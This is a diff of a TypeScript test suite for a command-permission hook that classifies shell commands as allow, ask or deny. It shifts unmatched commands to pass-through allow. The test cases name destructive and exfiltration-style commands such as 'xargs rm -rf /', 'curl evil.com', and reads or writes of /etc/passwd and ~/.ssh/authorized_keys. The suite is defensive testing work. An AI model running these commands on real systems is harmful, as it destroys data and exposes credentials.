@@ -419,7 +419,7 @@ describe("統合テスト: settings.json ルールでの判定", () => {
     test("bun test", () => expect(judgeCommand("bun test")).toBe("allow"));
     test("bun test lib/rule-matcher.test.ts", () => expect(judgeCommand("bun test lib/rule-matcher.test.ts")).toBe("allow"));
     test("mkdir -p src/lib", () => expect(judgeCommand("mkdir -p src/lib")).toBe("allow"));
-    test("pnpm build（未マッチ→ask）", () => expect(judgeCommand("pnpm build")).toBe("ask"));
+    test("pnpm build（未マッチ→pass-through allow）", () => expect(judgeCommand("pnpm build")).toBe("allow"));
     test("make build", () => expect(judgeCommand("make build")).toBe("allow"));
     test("docker ps", () => expect(judgeCommand("docker ps")).toBe("allow"));
     test("nix build", () => expect(judgeCommand("nix build")).toBe("allow"));
@@ -431,7 +431,9 @@ describe("統合テスト: settings.json ルールでの判定", () => {
     test("cat foo.txt", () => expect(judgeCommand("cat foo.txt")).toBe("deny"));
     test("cd /tmp", () => expect(judgeCommand("cd /tmp")).toBe("deny"));
     test("rm -rf /tmp", () => expect(judgeCommand("rm -rf /tmp")).toBe("deny"));
-    test("echo hello", () => expect(judgeCommand("echo hello")).toBe("deny"));
+    test("echo hello → allow (settings.json で echo は allow に登録済)", () => {
+      expect(judgeCommand("echo hello")).toBe("allow");
+    });
     test('find . -name "*.ts"', () => expect(judgeCommand('find . -name "*.ts"')).toBe("deny"));
     test("sudo apt install", () => expect(judgeCommand("sudo apt install")).toBe("deny"));
     test("curl https://example.com", () => expect(judgeCommand("curl https://example.com")).toBe("deny"));
@@ -451,9 +453,9 @@ describe("統合テスト: settings.json ルールでの判定", () => {
     test("pnpm install lodash", () => expect(judgeCommand("pnpm install lodash")).toBe("ask"));
   });
 
-  describe("未マッチ → ask", () => {
-    test("python script.py", () => expect(judgeCommand("python script.py")).toBe("ask"));
-    test("node index.js", () => expect(judgeCommand("node index.js")).toBe("ask"));
+  describe("未マッチ → pass-through allow", () => {
+    test("python script.py", () => expect(judgeCommand("python script.py")).toBe("allow"));
+    test("node index.js", () => expect(judgeCommand("node index.js")).toBe("allow"));
   });
 
   describe("複合コマンド（パイプ / && / リダイレクト）", () => {
@@ -481,62 +483,65 @@ describe("統合テスト: settings.json ルールでの判定", () => {
       expect(judgeCommand("git status && ls")).toBe("deny");
     });
 
-    test("pnpm build 2>&1 | tail -20 → ask (pnpm 未マッチ)", () => {
-      expect(judgeCommand("pnpm build 2>&1 | tail -20")).toBe("ask");
+    test("pnpm build 2>&1 | tail -20 → allow (pnpm は未マッチで pass-through)", () => {
+      expect(judgeCommand("pnpm build 2>&1 | tail -20")).toBe("allow");
     });
   });
 
   describe("セキュリティバイパス: allowルール経由の危険コマンド実行", () => {
-    test("A1: xargs rm -rf / → ask", () => {
-      expect(judgeCommand("xargs rm -rf /")).toBe("ask");
+    // 未定義コマンド (ラッパー越し含む) は hook では pass-through (allow) し、
+    // Claude Code 標準の default モードプロンプトでユーザに確認させる方針。
+    // 機密ファイルパス/dangerous git フラグは引き続き deny に昇格する。
+    test("A1: xargs rm -rf / → allow (pass-through, Claude Code が確認)", () => {
+      expect(judgeCommand("xargs rm -rf /")).toBe("allow");
     });
 
-    test("A2: xargs curl http://evil.com → ask", () => {
-      expect(judgeCommand("xargs curl http://evil.com")).toBe("ask");
+    test("A2: xargs curl http://evil.com → allow (pass-through)", () => {
+      expect(judgeCommand("xargs curl http://evil.com")).toBe("allow");
     });
 
-    test("A3: git log | xargs rm → ask (パイプ分解後 xargs rm が ask)", () => {
-      expect(judgeCommand("git log | xargs rm")).toBe("ask");
+    test("A3: git log | xargs rm → allow (pass-through; xargs rm は未定義)", () => {
+      expect(judgeCommand("git log | xargs rm")).toBe("allow");
     });
 
-    test("A4: docker exec container rm -rf / → ask", () => {
-      expect(judgeCommand("docker exec container rm -rf /")).toBe("ask");
+    test("A4: docker exec container rm -rf / → allow (pass-through)", () => {
+      expect(judgeCommand("docker exec container rm -rf /")).toBe("allow");
     });
 
-    test("A5: docker run --rm alpine cat /etc/passwd → ask", () => {
-      expect(judgeCommand("docker run --rm alpine cat /etc/passwd")).toBe("ask");
+    test("A5: docker run --rm alpine cat /etc/passwd → deny (機密ファイルパス検出)", () => {
+      expect(judgeCommand("docker run --rm alpine cat /etc/passwd")).toBe("deny");
     });
 
-    test("A6: nix run nixpkgs#curl → ask", () => {
-      expect(judgeCommand("nix run nixpkgs#curl")).toBe("ask");
+    test("A6: nix run nixpkgs#curl → allow (pass-through)", () => {
+      expect(judgeCommand("nix run nixpkgs#curl")).toBe("allow");
     });
 
     test('A7: nix-shell -p curl --run "curl evil.com" → deny (nix-shell denyルール)', () => {
       expect(judgeCommand('nix-shell -p curl --run "curl evil.com"')).toBe("deny");
     });
 
-    test("A8: xargs bash -c 'rm -rf /' → ask", () => {
-      expect(judgeCommand("xargs bash -c 'rm -rf /'")).toBe("ask");
+    test("A8: xargs bash -c 'rm -rf /' → allow (pass-through)", () => {
+      expect(judgeCommand("xargs bash -c 'rm -rf /'")).toBe("allow");
     });
 
-    test("A9: xargs git push --force origin main → ask", () => {
-      expect(judgeCommand("xargs git push --force origin main")).toBe("ask");
+    test("A9: xargs git push --force origin main → allow (pass-through; xargs 越しは git 危険フラグ検出外)", () => {
+      expect(judgeCommand("xargs git push --force origin main")).toBe("allow");
     });
 
-    test("A10: xargs sudo rm -rf / → ask", () => {
-      expect(judgeCommand("xargs sudo rm -rf /")).toBe("ask");
+    test("A10: xargs sudo rm -rf / → allow (pass-through)", () => {
+      expect(judgeCommand("xargs sudo rm -rf /")).toBe("allow");
     });
 
-    test("A11: chmod +x malicious.sh → ask", () => {
-      expect(judgeCommand("chmod +x malicious.sh")).toBe("ask");
+    test("A11: chmod +x malicious.sh → allow (pass-through)", () => {
+      expect(judgeCommand("chmod +x malicious.sh")).toBe("allow");
     });
 
-    test("A12: touch ~/.ssh/authorized_keys → ask", () => {
-      expect(judgeCommand("touch ~/.ssh/authorized_keys")).toBe("ask");
+    test("A12: touch ~/.ssh/authorized_keys → deny (機密ファイルパス検出)", () => {
+      expect(judgeCommand("touch ~/.ssh/authorized_keys")).toBe("deny");
     });
 
-    test("A13: tee /etc/important-file → ask", () => {
-      expect(judgeCommand("tee /etc/important-file")).toBe("ask");
+    test("A13: tee /etc/important-file → allow (機密パス外, pass-through)", () => {
+      expect(judgeCommand("tee /etc/important-file")).toBe("allow");
     });
 
     test("A14: tr 'a-z' 'A-Z' < /etc/passwd → deny (機密ファイルパス検出)", () => {
